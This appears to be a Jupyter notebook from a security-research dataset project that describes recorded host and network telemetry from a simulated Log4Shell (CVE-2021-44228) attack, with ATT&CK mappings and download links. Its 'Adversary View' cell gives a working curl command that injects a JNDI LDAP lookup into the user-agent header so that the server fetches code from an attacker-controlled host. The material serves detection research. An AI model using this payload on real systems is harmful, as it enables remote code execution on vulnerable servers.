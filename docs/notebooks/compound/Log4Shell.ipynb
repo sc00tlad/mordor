{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "d3b07fa6",
   "metadata": {},
   "source": [
    "# Log4Shell"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "684f8133",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d212eae4",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2021/12/11 |\n",
    "| Modification Date | 2022/05/13 |\n",
    "| Tactics           | [TA0001](https://attack.mitre.org/tactics/TA0001),[TA0002](https://attack.mitre.org/tactics/TA0002) |\n",
    "| Techniques        | [T1190](https://attack.mitre.org/techniques/T1190),[T1203](https://attack.mitre.org/techniques/T1203) |\n",
    "| Tags              | None |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "11b5052c",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "Datasets created while simulating a threat actor exploiting [CVE 2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228) via a JNDI Reference Java Object.\n",
    "In Log4j <= 2.14, `Message Lookups` were enabled by default creating an input validation vulnerability.\n",
    "A threat actor could take advantage of this vulnerability to make a Java application process JNDI lookups to download and execute Java objects from an attacker controlled naming service.\n",
    "There are a few types of Java objects that can be stored in a directory service.\n",
    "A JNDI reference object is one of them. A JNDI reference jave object points to the location of the Java object requested. \n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "95bdd0d7",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ff0fa2ad",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Network | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/compound/Log4Shell/pcap_log4shell_cve2021_44228_jndi_reference.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/compound/Log4Shell/pcap_log4shell_cve2021_44228_jndi_reference.zip) |\n",
    "| Network | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/compound/Log4Shell/pcap_log4shell_cve2021_44228_java_serialized.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/compound/Log4Shell/pcap_log4shell_cve2021_44228_java_serialized.zip) |\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/compound/Log4Shell/securityauditing_log4shell_cve2021_44228_java_serialized_object.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/compound/Log4Shell/securityauditing_log4shell_cve2021_44228_java_serialized_object.zip) |\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/compound/log4shell/sysmon_log4shell_cve2021_44228_java_serialized_object.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/compound/log4shell/sysmon_log4shell_cve2021_44228_java_serialized_object.zip) |\n",
    "| Network | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/compound/log4shell/vminsights_vmconnection_log4shell_cve2021_44228_jndi_reference.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/compound/log4shell/vminsights_vmconnection_log4shell_cve2021_44228_jndi_reference.zip) |\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/compound/log4shell/syslog_auoms_auditd_log4shell_cve2021_44228_jndi_reference.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/compound/log4shell/syslog_auoms_auditd_log4shell_cve2021_44228_jndi_reference.zip) |\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/compound/log4shell/syslog_sysmon_log4shell_cve2021_44228_jndi_reference.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/compound/log4shell/syslog_sysmon_log4shell_cve2021_44228_jndi_reference.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1992d236",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ddcac4c3",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7430ef31",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| Manual | sh | [sh](https://github.com/Cyb3rWard0g/log4jshell-lab/blob/main/research-notes/2021-12-11_01-CVE-2021-44228-simulation.md) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "109725eb",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "curl -X GET -H 'user-agent: ${jndi:ldap://192.168.2.6:1389/o=reference}' 192.168.2.5:8080/Log4j-2.14.0-SNAPSHOT/api\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cb00e275",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://isc.sans.edu/diary/RCE+in+log4j%2C+Log4Shell%2C+or+how+things+can+get+bad+quickly/28120](https://isc.sans.edu/diary/RCE+in+log4j%2C+Log4Shell%2C+or+how+things+can+get+bad+quickly/28120) \n",
    "* [https://github.com/OTRF/Microsoft-Sentinel2Go/tree/master/grocery-list/Linux/demos/CVE-2021-44228-Log4Shell](https://github.com/OTRF/Microsoft-Sentinel2Go/tree/master/grocery-list/Linux/demos/CVE-2021-44228-Log4Shell) \n",
    "* [https://github.com/Cyb3rWard0g/log4jshell-lab](https://github.com/Cyb3rWard0g/log4jshell-lab) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
